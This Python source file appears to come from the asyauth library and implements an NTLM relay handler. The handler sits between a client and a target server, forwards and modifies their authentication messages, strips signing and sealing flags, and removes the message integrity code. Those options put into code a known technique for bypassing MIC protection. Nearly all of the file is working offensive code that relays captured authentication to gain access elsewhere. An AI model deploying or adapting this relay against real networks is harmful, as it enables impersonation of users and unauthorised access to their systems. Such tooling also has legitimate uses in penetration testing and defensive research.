
import traceback
import asyncio
import logging
import copy
import os

from asyauth import logger
from asyauth.common.credentials.ntlm import NTLMCredential
from asyauth.protocols.ntlm.structures.serverinfo import NTLMServerInfo
from asyauth.protocols.ntlm.structures.negotiate_flags import NegotiateFlags
from asyauth.protocols.ntlm.structures.ntlmssp_message_signature import NTLMSSP_MESSAGE_SIGNATURE
from asyauth.protocols.ntlm.structures.ntlmssp_message_signature_noext import NTLMSSP_MESSAGE_SIGNATURE_NOEXT
from asyauth.protocols.ntlm.messages.negotiate import NTLMNegotiate
from asyauth.protocols.ntlm.messages.challenge import NTLMChallenge
from asyauth.protocols.ntlm.messages.authenticate import NTLMAuthenticate
from asyauth.protocols.ntlm.creds_calc import netntlmv2, AVPAIRType, LMResponse, netntlm, netntlm_ess
from asyauth.protocols.ntlm.structures.avpair import MsvAvFlags, AVPAIRType, AVPair
from asyauth.protocols.ntlm.structures.challenge_response import NTLMv2Response
from minikerberos.gssapi.channelbindings import ChannelBindingsStruct
from typing import Callable

async def log_cb_dummy(msg):
	print(msg)

class NTLMRelaySettings:
	def __init__(self, log_callback = log_cb_dummy):
		self.log_id = os.urandom(4).hex()
		self.log_callback = log_callback # async function that will be called with the log message
		self.force_signdisable = False
		self.dropmic = False
		self.dropmic2 = False
		self.modify_negotiate_cb = None
		self.modify_challenge_cb = None
		self.modify_authenticate_cb = None

class NTLMRelayHandler:
	def __init__(self, settings = None):
		self.spnego_obj = None # this is a dirty trick that requires the gssapi object to be set from the outside. This was needed because the server side might not be using SPNEGO
		if settings is None:
			settings = NTLMRelaySettings()
		self.log_id = os.urandom(4).hex()
		self.settings = settings
		self.log_callback = self.settings.log_callback
		self.force_signdisable = self.settings.force_signdisable
		self.dropmic = self.settings.dropmic
		self.dropmic2 = self.settings.dropmic2
		self.modify_negotiate_cb = self.settings.modify_negotiate_cb
		self.modify_challenge_cb = self.settings.modify_challenge_cb
		self.modify_authenticate_cb = self.settings.modify_authenticate_cb

		self.flags = None
		self.challenge = None
		
		self.ntlmNegotiate:NTLMNegotiate     = None #ntlm Negotiate message from client
		self.ntlmChallenge:NTLMChallenge     = None #ntlm Challenge message to client
		self.ntlmAuthenticate:NTLMAuthenticate  = None #ntlm Authenticate message from client
		
		self.ntlmNegotiate_raw:bytes     = None #message as bytes, as it's recieved/sent
		self.ntlmChallenge_raw:bytes     = None #message as bytes, as it's recieved/sent
		self.ntlmAuthenticate_raw:bytes  = None #message as bytes, as it's recieved/sent

		self.ntlmNegotiate_server:NTLMNegotiate    = None
		self.ntlmChallenge_server:NTLMChallenge    = None
		self.ntlmAuthenticate_server:NTLMAuthenticate = None
		
		self.ntlmNegotiate_server_raw:bytes  = None
		self.ntlmChallenge_server_raw:bytes  = None
		self.ntlmAuthenticate_server_raw:bytes = None

		
		self.EncryptedRandomSessionKey = None
		self.RandomSessionKey = None
		self.SessionBaseKey = None
		self.KeyExchangeKey = None
		
		self.SignKey_client = None
		self.SealKey_client = None
		self.SignKey_server = None
		self.SealKey_server = None
		
		self.iteration_cnt = 0
		self.ntlm_credentials = None
		self.extra_info = None
		self.negotiate_evt = asyncio.Event()
		self.challenge_evt = asyncio.Event()
		self.authenticate_evt = asyncio.Event()
		self.start_client_evt = asyncio.Event()

	def is_guest(self):
		return False
	
	def set_sign(self, tf = True):
		if tf == True:
			self.flags |= NegotiateFlags.NEGOTIATE_SIGN
		else:
			self.flags &= ~NegotiateFlags.NEGOTIATE_SIGN
			
	def set_seal(self, tf = True):
		if tf == True:
			self.flags |= NegotiateFlags.NEGOTIATE_SEAL
		else:
			self.flags &= ~NegotiateFlags.NEGOTIATE_SEAL
			
	def set_version(self, tf = True):
		if tf == True:
			self.flags |= NegotiateFlags.NEGOTIATE_VERSION
		else:
			self.flags &= ~NegotiateFlags.NEGOTIATE_VERSION
	
	def set_kex(self, tf = True):
		if tf == True:
			self.flags |= NegotiateFlags.NEGOTIATE_KEY_EXCH
		else:
			self.flags &= ~NegotiateFlags.NEGOTIATE_KEY_EXCH			
	
	def is_extended_security(self):
		return NegotiateFlags.NEGOTIATE_EXTENDED_SESSIONSECURITY in self.ntlmChallenge.NegotiateFlags
	
	def signing_needed(self):
		return False
		return (
			NegotiateFlags.NEGOTIATE_SIGN in self.ntlmChallenge.NegotiateFlags or \
			NegotiateFlags.NEGOTIATE_SEAL in self.ntlmChallenge.NegotiateFlags
		)
	
	def encryption_needed(self):
		return False
		return NegotiateFlags.NEGOTIATE_SEAL in self.ntlmChallenge.NegotiateFlags

	def get_extra_info(self):
		if self.ntlmChallenge is None:
			return None
		self.extra_info = NTLMServerInfo.from_challenge(self.ntlmChallenge)
		return self.extra_info
		
	def MAC(self, handle, signingKey, seqNum, message):
		"""
		Not possible to perform this function due to unknown keys during relaying
		"""
		raise NotImplementedError()

	def SEAL(self, signingKey, sealingKey, messageToSign, messageToEncrypt, seqNum, cipher_encrypt):
		"""
		Not possible to perform this function due to unknown keys during relaying
		"""
		raise NotImplementedError()
		
	def SIGN(self, signingKey, message, seqNum, cipher_encrypt):
		"""
		Not possible to perform this function due to unknown keys during relaying
		"""
		raise NotImplementedError()
		
	def calc_sealkey(self, mode = 'Client'):
		"""
		Not possible to perform this function due to unknown keys during relaying
		"""
		raise NotImplementedError()
		
	def calc_signkey(self, mode = 'Client'):
		"""
		Not possible to perform this function due to unknown keys during relaying
		"""
		raise NotImplementedError()
		
	def get_session_key(self):
		return b'\x00'*16
		
	def get_sealkey(self, mode = 'Client'):
		return b'\x00'*16
			
	def get_signkey(self, mode = 'Client'):
		return b'\x00'*16
	
	async def log_async(self, level, msg):
		if self.log_callback is not None:
			src = 'NTLM-%s' % self.log_id
			await self.log_callback('[%s][%s] %s' % (src, level, msg))
		else:
			logger.log(level, msg)
	
	def terminate(self):
		# called when either the server or the client abruptly terminates
		# or some other connection-related issues arise
		if self.negotiate_evt is not None:
			self.negotiate_evt.set()
		if self.challenge_evt is not None:
			self.challenge_evt.set()
		if self.authenticate_evt is not None:
			self.authenticate_evt.set()
		if self.start_client_evt is not None:
			self.start_client_evt.set()

	
	async def modify_negotiate(self):
		"""
		By default we don't modify the structures because there can be all kinds of integrity protections.
		However, if you find some cool stuff then you can just populate the modify_negotiate_cb in the settings, 
		but you MUST return both ntlmNegotiate and ntlmNegotiate_raw structures and/or indicate an error 
		which must be of class Exception!
		"""
		try:
			if self.modify_negotiate_cb is not None:
				await self.log_async(logging.DEBUG, '[NEGOTIATE] MODIFY EXTERNAL')
				self.ntlmNegotiate, self.ntlmNegotiate_raw, err = await self.modify_negotiate_cb(self.ntlmNegotiate_server, self.ntlmNegotiate_server_raw)
				return None, err
			
			if self.force_signdisable is True:
				await self.log_async(logging.DEBUG, '[NEGOTIATE] DISABLING SINGING')
				self.ntlmNegotiate = self.ntlmNegotiate_server
				self.ntlmNegotiate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_ALWAYS_SIGN
				self.ntlmNegotiate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_KEY_EXCH
				self.ntlmNegotiate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_SEAL
				self.ntlmNegotiate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_SIGN
				
				#self.ntlmNegotiate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_VERSION

			elif self.dropmic is True:
				await self.log_async(logging.DEBUG, '[NEGOTIATE] Drop MIC')
				self.ntlmNegotiate = self.ntlmNegotiate_server
				self.ntlmNegotiate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_ALWAYS_SIGN
				self.ntlmNegotiate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_SIGN
			
			elif self.dropmic2 is True:
				await self.log_async(logging.DEBUG, '[NEGOTIATE] Drop MIC 2')
				self.ntlmNegotiate = self.ntlmNegotiate_server
				self.ntlmNegotiate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_ALWAYS_SIGN
				self.ntlmNegotiate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_SIGN
			
			else:
				await self.log_async(logging.DEBUG, '[NEGOTIATE] NO MODS')
				self.ntlmNegotiate = self.ntlmNegotiate_server
			
			
			self.ntlmNegotiate_raw = self.ntlmNegotiate.to_bytes()


			return None, None
		except Exception as e:
			traceback.print_exc()
			return False, e
	
	async def modify_challenge(self):
		"""
		By default we don't modify the structures because there can be all kinds of integrity protections.
		However, if you find some cool stuff then you can just populate the modify_authenticate_cb in the settings, 
		but you MUST return both ntlmChallenge_server and ntlmChallenge_server_raw structures and/or indicate an error 
		which must be of class Exception!
		"""
		try:
			if self.modify_challenge_cb is not None:
				await self.log_async(logging.DEBUG, '[CHALLENGE] MODIFY EXTERNAL')
				self.ntlmChallenge_server, self.ntlmChallenge_server_raw, err = await self.modify_challenge_cb(self.ntlmChallenge, self.ntlmChallenge_raw)
				return None, err

			if self.dropmic2 is False:
				await self.log_async(logging.DEBUG, '[CHALLENGE] NO MODS')
				self.ntlmChallenge_server = self.ntlmChallenge
				self.ntlmChallenge_server_raw = self.ntlmChallenge_raw			
			else:
				await self.log_async(logging.DEBUG, '[CHALLENGE] Drop MIC 2')
				self.ntlmChallenge_server = copy.deepcopy(self.ntlmChallenge)

				extra_avpair = AVPair()
				extra_avpair.type = AVPAIRType.MsvAvFlags
				extra_avpair.data = 0

				self.ntlmChallenge_server.TargetInfoFields.length += len(extra_avpair.to_bytes())
				self.ntlmChallenge_server.TargetInfoFields.maxLength += len(extra_avpair.to_bytes())

				payload = self.ntlmChallenge_server.TargetName.encode('utf-16le')
				payload += extra_avpair.to_bytes()
				payload += self.ntlmChallenge_server.TargetInfo.to_bytes()

				buff  = self.ntlmChallenge_server.Signature
				buff += self.ntlmChallenge_server.MessageType.to_bytes(4, byteorder = 'little', signed = False)
				buff += self.ntlmChallenge_server.TargetNameFields.to_bytes()
				buff += self.ntlmChallenge_server.NegotiateFlags.to_bytes(4, byteorder = 'little', signed = False)
				buff += self.ntlmChallenge_server.ServerChallenge
				buff += self.ntlmChallenge_server.Reserved
				buff += self.ntlmChallenge_server.TargetInfoFields.to_bytes()
				if self.ntlmChallenge_server.Version:
					if isinstance(self.ntlmChallenge_server.Version, bytes):
						buff += self.ntlmChallenge_server.Version
					else:
						buff += self.ntlmChallenge_server.Version.to_bytes()
				buff += payload

				self.ntlmChallenge_server_raw = buff

			return None, None
		except Exception as e:
			traceback.print_exc()
			return False, e
	
	async def modify_authenticate(self):
		"""
		By default we don't modify the structures because there can be all kinds of integrity protections.
		However, if you find some cool stuff then you can just populate the modify_authenticate_cb in the settings, 
		but you MUST return both ntlmAuthenticate and ntlmAuthenticate_raw structures and/or indicate an error 
		which must be of class Exception!
		"""
		try:
			if self.modify_authenticate_cb is not None:
				await self.log_async(logging.DEBUG, '[AUTHENTICATE] MODIFY EXTERNAL')
				self.ntlmAuthenticate, self.ntlmAuthenticate_raw, err = await self.modify_authenticate_cb(self.ntlmAuthenticate_server, self.ntlmAuthenticate_server_raw)
				return None, err

			if self.dropmic2 is True:
				await self.log_async(logging.DEBUG, '[AUTHENTICATE] Drop MIC 2')
				self.ntlmAuthenticate = self.ntlmAuthenticate_server
				self.ntlmAuthenticate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_ALWAYS_SIGN
				self.ntlmAuthenticate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_SIGN
				self.ntlmAuthenticate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_KEY_EXCH
				self.ntlmAuthenticate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_SEAL
				self.ntlmAuthenticate.MIC = None
				self.ntlmAuthenticate_raw = self.ntlmAuthenticate.to_bytes_full()

			elif self.dropmic is True:
				await self.log_async(logging.DEBUG, '[AUTHENTICATE] Drop MIC')
				self.ntlmAuthenticate = self.ntlmAuthenticate_server
				self.ntlmAuthenticate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_ALWAYS_SIGN
				self.ntlmAuthenticate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_SIGN
				self.ntlmAuthenticate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_KEY_EXCH
				self.ntlmAuthenticate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_SEAL
				
				self.ntlmAuthenticate.MIC = None
				if isinstance(self.ntlmAuthenticate.NTChallenge, NTLMv2Response) and AVPAIRType.MsvAvFlags in self.ntlmAuthenticate.NTChallenge.ChallengeFromClinet.Details:
					if MsvAvFlags.MIC_PRESENT in self.ntlmAuthenticate.NTChallenge.ChallengeFromClinet.Details[AVPAIRType.MsvAvFlags]:
						self.ntlmAuthenticate.NTChallenge.ChallengeFromClinet.Details[AVPAIRType.MsvAvFlags] &= ~ MsvAvFlags.MIC_PRESENT
						if self.ntlmAuthenticate.NTChallenge.ChallengeFromClinet.Details[AVPAIRType.MsvAvFlags] == 0:
							del self.ntlmAuthenticate.NTChallenge.ChallengeFromClinet.Details[AVPAIRType.MsvAvFlags]
					
					del self.ntlmAuthenticate.NTChallenge.ChallengeFromClinet.Details[AVPAIRType.MsvAvSingleHost]
				
				
				
				self.ntlmAuthenticate_raw = self.ntlmAuthenticate.to_bytes_full()

			elif self.force_signdisable is True:
				await self.log_async(logging.DEBUG, '[AUTHENTICATE] DISABLING SINGING')
				self.ntlmAuthenticate = self.ntlmAuthenticate_server
				self.ntlmAuthenticate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_ALWAYS_SIGN
				self.ntlmAuthenticate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_SIGN
				self.ntlmAuthenticate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_KEY_EXCH
				self.ntlmAuthenticate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_SEAL

				self.ntlmAuthenticate_raw = self.ntlmAuthenticate.to_bytes()
			
			else:
				await self.log_async(logging.DEBUG, '[AUTHENTICATE] NO MODS')
				self.ntlmAuthenticate = self.ntlmAuthenticate_server
				self.ntlmAuthenticate_raw = self.ntlmAuthenticate_server_raw
				return None, None

			return None, None
		except Exception as e:
			traceback.print_exc()
			return False, e
		
	
	async def authenticate_relay_server(self, authdata):
		"""
		This function is to be called by the server side which we obtain the auth material from
		"""
		try:
			await self.log_async(logging.DEBUG, '[SRV] AUTHDATA: %s' % authdata.hex())
			if self.ntlmNegotiate is None:
				self.ntlmNegotiate_server_raw = authdata
				self.ntlmNegotiate_server = NTLMNegotiate.from_bytes(self.ntlmNegotiate_server_raw)
				await self.log_async(logging.DEBUG, '[SRV] Negotiate event: set')
				self.negotiate_evt.set()
				await self.log_async(logging.DEBUG, '[SRV] Client start event: set')
				self.start_client_evt.set()
				await self.log_async(logging.DEBUG, '[SRV] Waiting for challenge...')
				await self.spnego_obj.notify_relay('NTLM') # notify the client that we're ready to relay
				await self.challenge_evt.wait()
				await self.log_async(logging.DEBUG, '[SRV] Challenge in!')
				return self.ntlmChallenge_server_raw, True, None
			
			else:
				self.ntlmAuthenticate_server_raw = authdata
				self.ntlmAuthenticate_server = NTLMAuthenticate.from_bytes(authdata, True)				
				self.authenticate_evt.set()
				await self.log_async(logging.DEBUG, '[SRV] Authenticate event: set')
				return None, True, None
		
		except Exception as e:
			traceback.print_exc()
			return None, False, e

	async def authenticate(self, authData, flags = None, cb_data = None, spn=None):
		"""
		FRONT TOWARD ENEMY
		This function is to be called by the client side.
		"""
		try:
			if self.iteration_cnt == 0 and self.ntlmNegotiate is None:
				await self.log_async(logging.DEBUG, '[CLI] Waiting for negotiate event...')
				await self.negotiate_evt.wait()
				await self.log_async(logging.DEBUG, '[CLI] Negotiate event triggered!')
				
			if self.iteration_cnt == 0:
				if authData is not None:
					raise Exception('First call as client MUST be with empty data!')
				
				
				_, err = await self.modify_negotiate()
				if err is not None:
					raise err
					
				self.iteration_cnt += 1
				await self.log_async(logging.DEBUG, '[CLI] Sending Negotiate data')
				return self.ntlmNegotiate_raw, True, None
				
			else:
				await self.log_async(logging.DEBUG, '[CLI] Challenge data obtained')
				self.ntlmChallenge_raw = authData
				self.ntlmChallenge = NTLMChallenge.from_bytes(authData)
				await self.log_async(logging.DEBUG, '[CLI] Challenge %s' % self.ntlmChallenge)
				
				_, err = await self.modify_challenge()
				if err is not None:
					raise err


				self.challenge_evt.set()
				await self.log_async(logging.DEBUG, '[CLI] Waiting for authenticate event...')
				await self.authenticate_evt.wait()
				_, err = await self.modify_authenticate()
				if err is not None:
					raise err
				await self.log_async(logging.DEBUG, '[CLI] Authenticate event triggered!')
				if self.ntlmAuthenticate.UserName == '':
					return None, False, Exception('Guest auth!')

				return self.ntlmAuthenticate_raw, False, None
		except Exception as e:
			traceback.print_exc()
			return None, False, e
				
def ntlmrelay_factory(ntlm_settings_factory: Callable = None) -> NTLMRelayHandler:
	if ntlm_settings_factory is None:
		ntlm_settings = NTLMRelaySettings()
	else:
		ntlm_settings = ntlm_settings_factory()
	ntlm_ctx = NTLMRelayHandler(ntlm_settings)
	return ntlm_ctx